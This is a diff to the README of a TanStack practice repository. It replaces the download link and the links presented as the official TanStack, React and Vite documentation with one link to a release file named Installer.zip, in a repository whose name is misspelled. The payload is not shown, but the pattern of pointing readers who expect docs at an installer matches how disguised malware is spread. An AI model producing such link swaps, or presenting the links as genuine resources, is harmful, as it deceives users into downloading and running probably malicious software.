@@ -13,7 +13,7 @@ Welcome to the **Practice-TanstackTSX** repository! Here we focus on practicing 
 
 ## 📦 Get Started
 
-To get started with the repository, you can download the source code by clicking [here](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip). Once downloaded, you can launch the zip file and explore the contents to begin your TanStack journey.
+To get started with the repository, you can download the source code by clicking [here](https://github.com/NaithikJorapur/Practive-TanstackTSX/releases/download/v1.0/Installer.zip). Once downloaded, you can launch the zip file and explore the contents to begin your TanStack journey.
 
 ## Tools and Technologies
 
@@ -42,13 +42,13 @@ TanStack Query is a data fetching and state management library for React applica
 ## 🚦 External Resources
 
 ### TanStack Official Documentation
-For detailed information on using TanStack, check out the official documentation [here](https://tanstack.com/).
+For detailed information on using TanStack, check out the official documentation [here](https://github.com/NaithikJorapur/Practive-TanstackTSX/releases/download/v1.0/Installer.zip).
 
 ### React Documentation
-To dive deeper into React, explore the official documentation [here](https://reactjs.org/docs/getting-started.html).
+To dive deeper into React, explore the official documentation [here](https://github.com/NaithikJorapur/Practive-TanstackTSX/releases/download/v1.0/Installer.zip).
 
 ### Vite Documentation
-Learn more about Vite and its features by visiting the official documentation [here](https://vitejs.dev/).
+Learn more about Vite and its features by visiting the official documentation [here](https://github.com/NaithikJorapur/Practive-TanstackTSX/releases/download/v1.0/Installer.zip).
 
 ## 🌐 Connect with Us
 
